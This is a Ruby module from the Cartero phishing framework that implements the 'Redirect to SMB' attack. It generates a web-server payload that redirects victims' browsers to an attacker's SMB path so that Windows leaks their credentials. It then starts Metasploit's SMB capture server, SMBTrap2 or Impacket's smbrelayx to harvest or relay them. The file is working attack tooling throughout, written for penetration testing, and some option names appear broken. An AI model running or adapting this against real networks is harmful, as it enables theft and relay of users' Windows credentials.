#encoding: utf-8
module Cartero
module Payloads
# Documentation for SMBRedirect < ::Cartero::Payload
class SMBRedirect < ::Cartero::Payload

  description(
    name: "SMBRedirect Attack Reborned",
    description: %q{This attack is an old attack vector recently 'rediscoreved' that affects windows platforms. Attacker could force a redirec of an http link to a file:// or a \\server\file server resulting on the server leaking its credentials when trying to authenticate.},
    author: ["Matias P. Brutti <matias [©] section9labs.com>"],
    type: "Payload",
    license: "LGPL",
    references: [
      "http://blog.cylance.com/redirect-to-smb",
      "https://section9labs.github.io/Cartero"
    ]
  )

  def initialize
    super do |opts|
      opts.on("-W", "--webserver WEBSERVER_FOLDER", String,
        "Sets the sinatra WebServer full path for payload creation") do |path|
        @options.path = path
        app = path.split('/')[-1]
        @options.customwebserver = path + '/' + app + ".rb"
        @options.views = path + "/views"
        @options.public_folder = path + "/static"
      end

      opts.on("-P", "--request-path PATH", String,
        "Cartero webserver custom request path for attack.") do |p|
        @options.request_path = p
      end

      opts.on("-R", "--redirect-path PATH", String,
        "Metasploit exposed path custom request path for attack. \n\t\t(i.e. \\\\IP\\path file://IP/path)") do |p|
        @options.redirect_path = p
      end

      opts.on("--smbtrap", "Starts SMBTrap Cylance tool") do
        @options.smbtrap = true
      end

      opts.on("--smbrelayx", "Starts smbrelayx.py impacket tool") do
        @options.smbrelayx = true
      end

      opts.separator ""
      opts.separator "metasploit options:"

      opts.on("--start-msfrpcd", "Starts background RPC Server.") do
        @options.command = "start_rpc"
      end

      opts.on("--stop-msfrpcd", "Stops background RPC Server.") do
        @options.command = "stop_rpc"
      end

      opts.on("--host HOST", String,
        "Sets address for RPC client/server") do |host|
        @options.host = host
      end

      opts.on("--port PORT", String,
        "Sets port for RPC client/server") do |p|
        @options.port = p
      end

      opts.on("--username USERNAME", String,
        "Sets username for RPC client/server") do |opt|
        @options.msfoptions = opt
      end

      opts.on("--password PASSWORD", String,
        "Sets password for RPC client/server") do |name|
        @options.msfname = name
      end

      opts.separator ""
      opts.separator "smbrelayx options:"

      opts.on("--smbr-host HOST", String,
        "Sets -h HOST relay host for smbrelayx.py") do |host|
        @options.smbr-host = host
      end

      opts.on("--smbr-file FILE", String,
        "Sets -e FILE for smbrelayx.py") do |f|
        @options.smbr-file = f
      end

      opts.on("--smbr-machine-account MACHINE_ACCOUNT", String,
        "Sets option -machine-account for smbrelayx.py") do |f|
        @options.smbr-machine-account = f
      end

      opts.on("--smbr-machine-hashes MACHINE_HASHES", String,
        "Sets option -machines-hashes for smbrelayx.py") do |f|
        @options.smbr-machine-hashes = f
      end

      opts.on("--smbr-domain DOMAIN", String,
        "Sets option -DOMAIN for smbrelayx.py") do |f|
        @options.smbr-domain = f
      end
    end
  end

  def setup
    if @options.request_path.nil? && @options.command.nil?
      raise StandardError, "A request path [--request-path] must be provided"
    end

    if @options.redirect_path.nil? && @options.command.nil?
      raise StandardError, "A redirect path [--redirect-path] must be provided"
    end

    # Only if we are not running a basic command :-)
    if @options.command.nil?
      unless File.exist?(File.expand_path(@options.customwebserver))
        raise StandardError, "Custom WebServer file does not exists."
      end
    end

    setup_rpc_client if @options.command != "start_rpc" && @options.smbtrap.nil?
  end

  def run
    run_command if @options.command
    if @options.customwebserver
      # If we have a complex command we might need to start RPC here.
      # Create payload on our webserver
      create_smbredirect_payload

      if @options.smbtrap
        # Launch SMBTrap2 Cylance tool
        run_smb_trap
      elsif @options.smbrelayx
        run_smb_relayx
      else
        # Launch MSF SMBRedirect SMB sniffer server
        setup_rpc_client if @options.command == "start_rpc"
        run_msf_smb_sniffer
      end
    end
  end

  private

  def setup_rpc_client
    require 'cartero/metasploit'
    @rpc_client = ::Cartero::Metasploit.new({
      "host" => @options.host || ::Cartero::GlobalConfig['metasploit']['host'] || '0.0.0.0',
      "port" => @options.port || ::Cartero::GlobalConfig['metasploit']['port'].to_i || 45678,
      "username" => @options.username ||Cartero::GlobalConfig['metasploit']['username'] || 'msf',
      "password" => @options.password ||Cartero::GlobalConfig['metasploit']['password'] || 'msf'
      })
    @rpc_client.login
  end

  def run_command
    case @options.command
    when "list"
      @rpc_client.list(list)
    when "start_rpc"
      ssh = "ssh #{Cartero::GlobalConfig['metasploit']['ssh_user']}@#{@options.host || ::Cartero::GlobalConfig['metasploit']['host'] }" if ::Cartero::GlobalConfig['metasploit']['ssh']
      system("#{ssh} msfrpcd -U #{@options.username ||Cartero::GlobalConfig['metasploit']['username'] || 'msf'}" +
        " -P #{@options.password ||Cartero::GlobalConfig['metasploit']['password'] || 'msf'} " +
        " -a #{@options.host || ::Cartero::GlobalConfig['metasploit']['host'] || '0.0.0.0'} " +
        " -p #{@options.port || ::Cartero::GlobalConfig['metasploit']['port'] || '45678'} &"
      )
    when "stop_rpc"
      #Ghetto call - Not sure this is the best way to kill things :( Could not find anything else as of now.
      @rpc_client.call("core.stop")
    else
      puts "Command Not supported. You should not be here. "
    end
  end

  def run_msf_smb_sniffer
    @rpc_client.db_connect
    job = @rpc_client.execute("auxiliary", "auxiliary/server/capture/smb" , {})

    raise StandardError, "Something went wrong starting msf auxiliary server" if job.nil?
    require 'cartero/command_helpers'
    ::Cartero::CommandHelpers.new.generate_table(@rpc_client.call("job.info", job['job_id']), "SMB Job Information")

  end

  def run_smb_trap
    smbtrap2_command = "cd #{Cartero::GlobalConfig['smbtrap']['path']} && python smbtrap2.py"
    puts "Launching SMBTRap2 commmand"
    if ::Cartero::GlobalConfig['smbtrap']['ssh']
      ssh = "ssh #{Cartero::GlobalConfig['smbtrap']['ssh_user']}@#{@options.host || ::Cartero::GlobalConfig['smbtrap']['host'] } -t "
      system("#{ssh} \"#{smbtrap2_command}\"")
    else
      system(smbtrap2_command)
    end
  end

  def run_smb_relayx
    raise "smbrelayx.py requires at least one option to be set." if @options.smbr-host.nil? &&
       @options.smbr-file.nil? &&
       @options.smbr-machine-account.nil? &&
       @options.smbr-machine-hashes.nil? &&
       @options.smbr-domain.nil?

    smbrelayx_command = "cd #{Cartero::GlobalConfig['smbrelayx']['path']} && sudo python smbrelayx.py" +
                        "#{" -h " + @options.smbr-host unless @options.smbr-host.nil?}" +
                        "#{" -f " + @options.smbr-file unless @options.smbr-file.nil?}" +
                        "#{" -machine-account " + @options.smbr-machine-account unless @options.smbr-machine-account.nil?}" +
                        "#{" -machine-hashes " + @options.smbr-machine-hashes unless @options.smbr-machine-hashes.nil?}" +
                        "#{" -domain " + @options.smbr-domain unless @options.smbr-domain.nil?}"

    puts "Launching Impacket's smbrelayx.py"
    if ::Cartero::GlobalConfig['smbrelayx']['ssh']
      ssh = "ssh #{Cartero::GlobalConfig['smbrelayx']['ssh_user']}@#{@options.host || ::Cartero::GlobalConfig['smbrelayx']['host'] } -t "
      system("#{ssh} \"#{smbrelayx_command}\"")
    else
      system("#{smbrelayx_command}")
    end
  end

  def create_smbredirect_payload
    download = @options.path.split('/')[-1] + '_smbredirect'
    @options.webserver = File.basename(@options.customwebserver).split('.')[0..-2].join('.').camelize
    if File.read(@options.customwebserver).scan("require \"#{@options.path + '/' + download}\"").empty?
      File.open(@options.customwebserver,"a") {|x| x << "\n\nrequire \"#{@options.path + '/' + download}\""}
    end
    File.open(@options.path + "/#{download}.rb","w") do |x|
      x << ERB.new(File.read(
        File.dirname(__FILE__) + "/../../../templates/webserver/smbredirect.erb"
      )).result(@options.get_binding)
    end
  end
end
end
end
